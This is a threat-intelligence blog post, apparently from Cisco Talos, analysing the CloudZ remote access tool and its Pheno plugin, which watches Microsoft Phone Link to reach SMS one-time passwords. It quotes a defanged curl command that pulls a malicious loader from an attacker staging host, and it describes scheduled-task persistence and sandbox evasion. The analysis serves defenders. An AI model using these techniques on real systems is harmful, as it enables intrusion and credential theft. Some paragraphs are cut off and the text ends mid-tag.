    <h1 class="text-center">CloudZ RAT potentially steals OTP messages using Pheno plugin</h1>

    <div class="text-center m-1">
        <div class="post-author">
            <span>By </span>
                <a href="https://blog.talosintelligence.com/author/alex/">Alex Karkins</a>, 
                <a href="https://blog.talosintelligence.com/author/chetan/">Chetan Raghuprasad</a>
        </div>

        <br/>
        <time class="post-datetime" datetime="May 5, 2026 06:00">
            Tuesday, May 5, 2026 06:00
        </time>

        <div class="m-3">
                        <a href="https://blog.talosintelligence.com/category/threat-spotlight/" class="category primary-category">
                            Threat Spotlight
                        </a>
                                            <a href="https://blog.talosintelligence.com/category/rat/" class="category primary-category">
                            RAT
                        </a>
                            </div>
    </div>

    <section class="post-content-wrapper mt-5">
        <div class="post-content" id="post-content">
            <ul><li>Cisco Talos&nbsp;discovered&nbsp;an intrusion,&nbsp;active since&nbsp;at least&nbsp;January 2026,&nbsp;where an unknown attacker implanted a CloudZ remote access&nbsp;tool (RAT)&nbsp;and&nbsp;a previously undocumented plugin called “Pheno.”</li><li>According to the functionalities of the&nbsp;CloudZ&nbsp;RAT and&nbsp;Pheno&nbsp;plugin, this was&nbsp;with&nbsp;the&nbsp;intention&nbsp;of stealing&nbsp;victims’&nbsp;credentials and&nbsp;potentially&nbsp;one-time passwords&nbsp;(OTPs).&nbsp;</li><li>CloudZ&nbsp;utilizes&nbsp;the custom&nbsp;Pheno&nbsp;plugin&nbsp;to hijack the established PC-to-phone bridge by abusing the Microsoft Phone Link application, allowing&nbsp;the plugin&nbsp;to continuously scan for active Phone Link processes and potentially intercept sensitive mobile data like SMS and OTPs without deploying malware on the phone.&nbsp;</li><li>CloudZ&nbsp;evades detection by executing critical malicious functions dynamically in system memory and performing checks to avoid debuggers and sandbox environments.&nbsp;</li></ul><h2 id="attacker-abuses-the-windows-phone-link-application">Attacker abuses&nbsp;the Windows Phone Link application&nbsp;</h2><p>Windows Phone Link (formerly&nbsp;"Your Phone") is a synchronization tool developed by Microsoft and built directly into Windows 10 and 11 that bridges a PC and a smartphone (Android or iPhone).&nbsp;By&nbsp;establishing&nbsp;a secure connection via Wi-Fi and Bluetooth, the application mirrors essential phone activities&nbsp;(such as&nbsp;application&nbsp;notifications and&nbsp;SMS&nbsp;messages)&nbsp;onto the computer screen, reducing&nbsp;the user’s&nbsp;need to physically&nbsp;interact with the&nbsp;mobile device&nbsp;while working on the computer.&nbsp;The&nbsp;Phone Link application writes&nbsp;synchronized&nbsp;phone data such as SMS messages, call&nbsp;logs,&nbsp;and the application&nbsp;notification&nbsp;history&nbsp;to the Windows PC in the application’s SQLite database file.&nbsp;</p><p>Talos observed that&nbsp;during an intrusion,&nbsp;an attacker&nbsp;attempted&nbsp;to abuse the Windows Phone Link application using the&nbsp;CloudZ&nbsp;RAT&nbsp;and its&nbsp;Pheno&nbsp;plugin. The&nbsp;Pheno&nbsp;plugin is designed&nbsp;to&nbsp;monitor&nbsp;an active PC-to-phone bridge&nbsp;established&nbsp;by the Phone Link application on the victim machine.&nbsp;With a confirmed Phone Link activity on the victim's machine, the attacker&nbsp;using the&nbsp;CloudZ&nbsp;RAT&nbsp;can&nbsp;potentially&nbsp;intercept&nbsp;the Phone Link application’s&nbsp;SQLite database file&nbsp;(e.g.,&nbsp;“PhoneExperiences-*.db”)&nbsp;on the victim machine,&nbsp;potentially&nbsp;compromising&nbsp;SMS-based OTP&nbsp;messages&nbsp;and other authenticator application notification messages.&nbsp;</p><h2 id="intrusion-summary-of-cloudz-infection">Intrusion summary of&nbsp;CloudZ&nbsp;infection&nbsp;</h2><p>Talos discovered from telemetry data that the intrusion had begun with an unknown&nbsp;initial&nbsp;access&nbsp;vector&nbsp;to the victim's environment, which&nbsp;led to the execution of a fake&nbsp;ScreenConnect&nbsp;application update executable.&nbsp;This malicious executable drop&nbsp;and executes&nbsp;an intermediate .NET loader executable, which&nbsp;subsequently&nbsp;deploys&nbsp;the modular&nbsp;CloudZ&nbsp;on the victim’s machine. Upon execution, the RAT&nbsp;decrypts&nbsp;its configuration data,&nbsp;establishes&nbsp;an encrypted socket connection to the&nbsp;command-and-control (C2)&nbsp;server, and&nbsp;enters its command dispatcher mode.&nbsp;&nbsp;&nbsp;</p><p>CloudZ&nbsp;facilitates the&nbsp;C2&nbsp;commands to exfiltrate credentials from the&nbsp;victim&nbsp;machine browser data, and it downloads and implants a plugin.&nbsp;The plugin performs reconnaissance of&nbsp;the&nbsp;Microsoft Phone Link application on the victim machine and writes the&nbsp;reconnaissance&nbsp;data to an output file in a staging folder.&nbsp;CloudZ&nbsp;reads back the Phone Link application data from the staging folder and sends it to the C2 server.&nbsp;</p><h2 id="rust-compiled-executable-used-as-a-dropper">Rust-compiled executable used as a dropper&nbsp;</h2><p>Talos discovered a Rust-compiled 64-bit executable,&nbsp;disguised with file&nbsp;names&nbsp;such as&nbsp;“systemupdates.exe”&nbsp;or&nbsp;“Windows-interactive-update.exe”,&nbsp;functioning as a&nbsp;loader. The malicious&nbsp;loader&nbsp;was compiled on Jan.&nbsp;1, 2026, and has&nbsp;the&nbsp;developer string of&nbsp;<code>rustextractor.pdb</code>.&nbsp;</p><p>When&nbsp;the loader is run on the victim machine, it decrypts&nbsp;and drops&nbsp;an&nbsp;embedded .NET loader binary disguised as a text file with the file names&nbsp;“update.txt” or “msupdate.txt” in the folder “C:\ProgramData\Microsoft\windosDoc\”.&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2026/05/data-src-image-ccac0ae2-99ab-4114-a0be-c3ab035942cb-1.png" class="kg-image" alt="" loading="lazy" width="624" height="128" srcset="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/size/w600/2026/05/data-src-image-ccac0ae2-99ab-4114-a0be-c3ab035942cb-1.png 600w, https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2026/05/data-src-image-ccac0ae2-99ab-4114-a0be-c3ab035942cb-1.png 624w"><figcaption><span style="white-space: pre-wrap;">Figure 1. Excerpt of rusty dropper code. </span></figcaption></figure><p>In another instance,&nbsp;Talos&nbsp;observed&nbsp;that&nbsp;the .NET&nbsp;loader&nbsp;was implanted&nbsp;in the victim machine&nbsp;by downloading&nbsp;it&nbsp;from an attacker-controlled staging server using the command shown below:&nbsp;&nbsp;</p>
<!--kg-card-begin: html-->
<pre>curl -L -o C:\ProgramData\Microsoft\WindowsDoc\update[.]txt hxxps[://]calm-wildflower-1349[.]hellohiall[.]workers[.]dev</pre>
<!--kg-card-end: html-->
<p>The dropper executes&nbsp;an embedded PowerShell script&nbsp;to&nbsp;establish&nbsp;persistence&nbsp;on the victim machine&nbsp;through a Windows task&nbsp;which&nbsp;executes the dropped malicious&nbsp;.NET&nbsp;loader.&nbsp;The PowerShell script achieves it by initially performing&nbsp;a runtime check to&nbsp;determine&nbsp;whether the dropped&nbsp;.NET&nbsp;loader is already active on the system. It queries all running processes using the&nbsp;<code>Get-CimInstance Win32_Process</code> command and filters for any instance of&nbsp;<code>regasm.exe</code>&nbsp;with the&nbsp;command line&nbsp;parameters that&nbsp;include&nbsp;the string&nbsp;<code>update.txt</code>. If such an instance is found, the script silently exits without taking any action.&nbsp;</p><p>If the check&nbsp;indicates&nbsp;that the&nbsp;.NET&nbsp;loader is not running, the script proceeds to&nbsp;establish&nbsp;persistence by creating a scheduled task named&nbsp;<code>SystemWindowsApis</code>&nbsp;in the scheduled task folder&nbsp;<code>\Microsoft\Windows\</code>. It configures the task to trigger at system startup&nbsp;<code>/sc onstart</code>, execute under the SYSTEM account&nbsp;<code>/ru SYSTEM</code> with the highest privilege level&nbsp;<code>/rl HIGHEST</code>, and the&nbsp;<code>/f </code>flag ensures it will silently overwrite any existing task with the same name, allowing the malware to update its persistence mechanism. The script configures the task scheduler action to run the&nbsp;.NET&nbsp;loader by&nbsp;utilizing&nbsp;the living-off-the-land binary (LOLBin)&nbsp;regasm.exe,&nbsp;which is the&nbsp;.NET&nbsp;Framework Assembly Registration Utility&nbsp;located&nbsp;at&nbsp;“C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\”.&nbsp;It provides the path of the dropped&nbsp;.NET&nbsp;loader as the argument to regasm.exe with the&nbsp;<code>/nologo</code> flag. After creating the task, the script&nbsp;immediately&nbsp;triggers it with&nbsp;<code>schtasks /run</code>,&nbsp;ensuring it executes&nbsp;immediately&nbsp;and survives future reboots.&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2026/05/data-src-image-4b8aab16-162b-4fa6-80a4-1e6de336e095.png" class="kg-image" alt="" loading="lazy" width="624" height="172" srcset="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/size/w600/2026/05/data-src-image-4b8aab16-162b-4fa6-80a4-1e6de336e095.png 600w, https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2026/05/data-src-image-4b8aab16-162b-4fa6-80a4-1e6de336e095.png 624w"><figcaption><span style="white-space: pre-wrap;">Figure 2. Excerpt of the PowerShell script to&nbsp;establish&nbsp;persistence&nbsp;on victim&nbsp;machines.&nbsp;</span></figcaption></figure><h2 id="net-loader-implants-the-cloudz-rat">.NET loader implants the&nbsp;CloudZ&nbsp;RAT&nbsp;</h2><p>Talos&nbsp;found that&nbsp;the&nbsp;attacker embedded&nbsp;CloudZ,&nbsp;an encrypted .NET-compiled RAT,&nbsp;in the .NET loader executable.&nbsp;</p><p>When the .NET loader is triggered through the Windows task scheduler, it performs the detection evasion checks beginning with a&nbsp;timing-based&nbsp;evasion check, where it calculates the actual elapsed time of a sleep command to detect if it is executed in&nbsp;the analysis&nbsp;environment. It then performs enumeration of running processes in the victim machine against a list of security tools,&nbsp;including network sniffers like Wireshark and Fiddler, as well as&nbsp;system monitors like&nbsp;Procmon&nbsp;and Sysmon.&nbsp;The .NET loader&nbsp;exits&nbsp;the execution if&nbsp;these&nbsp;are detected in the victim environment.&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2026/05/data-src-image-ab8d36d3-1cf4-40a8-88c2-afb90311d328-1.png" class="kg-image" alt="" loading="lazy" width="597" height="569"><figcaption><span style="white-space: pre-wrap;">Figure 3. Excerpt of the .NET loader binary with&nbsp;detection&nbsp;evasion instructions. </span></figcaption></figure><p>The loader then&nbsp;conducts&nbsp;hardware&nbsp;and environment&nbsp;checks to&nbsp;identify&nbsp;virtual&nbsp;machine&nbsp;(VM) or sandbox characteristics. <p>The RAT&nbsp;employs various methods to download and execute the&nbsp;plugins.&nbsp;The&nbsp;plugin download&nbsp;feature of RAT&nbsp;uses&nbsp;a&nbsp;three-method fallback approach.&nbsp;It first checks for the presence of the curl utility. If found, it&nbsp;attempts&nbsp;to download the file from a specified URL to a target path while following redirects. If curl is missing or the command fails, it falls back to PowerShell, where it first tries to download the file using the&nbsp;<code>Invoke-WebRequest</code>&nbsp;command. <h2 id="pheno-plugin-to-perform-the-phone-link-application-recon">Pheno&nbsp;plugin&nbsp;to perform the Phone Link&nbsp;application&nbsp;recon&nbsp;</h2><p>In this&nbsp;intrusion,&nbsp;Talos&nbsp;observed&nbsp;that the attacker used a plugin called&nbsp;Pheno&nbsp;to&nbsp;perform&nbsp;reconnaissance of the Windows Phone Link application in the victim machine.&nbsp;&nbsp;</p><p>Pheno&nbsp;is designed to detect if a user is currently&nbsp;syncing&nbsp;their mobile device to&nbsp;a&nbsp;Windows&nbsp;machine through&nbsp;the&nbsp;Phone Link&nbsp;application. It scans all running processes for specific keywords&nbsp;such as&nbsp;"YourPhone," "PhoneExperienceHost," or "Link to Windows," and if matches are found, it logs their Process IDs and file paths to the files with the&nbsp;filename&nbsp;“phonelink-&lt;COMPUTERNAME&gt;.txt”, created in two&nbsp;staging&nbsp;folders such&nbsp;as&nbsp;:&nbsp;</p><ul><li>&nbsp;C:\programdata\Microsoft\feedback\cm&nbsp;</li><li>&nbsp;%TEMP%\Microsoft\feedback\cm&nbsp;</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2026/05/data-src-image-077640e8-d93d-4728-b322-af886fe8bd94-1.png" class="kg-image" alt="" loading="lazy" width="587" height="494"><figcaption><span style="white-space: pre-wrap;">Figure 11.&nbsp;Pheno&nbsp;recon plugin that&nbsp;monitors&nbsp;an active PC-to-phone bridge through Phone Link application.&nbsp;</span></figcaption></figure><p>After checking Phone Link processes and writing its results,&nbsp;Pheno&nbsp;executes a secondary check that reads back the contents of previously written files and searches the keyword "proxy" in a case-insensitive manner.&nbsp;The plugin conducts this check because the Microsoft Phone Link application creates a local proxy connection to relay traffic between the PC and the paired mobile device. The presence of "proxy" in the output files, whether generated by&nbsp;a previous&nbsp;execution of the&nbsp;pheno&nbsp;plugin,&nbsp;indicates&nbsp;that the Phone Link session is actively routing traffic through its relay channel.&nbsp;&nbsp;</p><p>When the keyword is detected, the&nbsp;pheno&nbsp;plugin writes "Maybe connected" to its output file in the staging&nbsp;folders,&nbsp;which eventually allows the attacker,&nbsp;with the help of&nbsp;CloudZ&nbsp;RAT,&nbsp;to&nbsp;potentially&nbsp;monitor&nbsp;SMS or OTP&nbsp;requests that&nbsp;appear&nbsp;on the Phone Link application.&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img
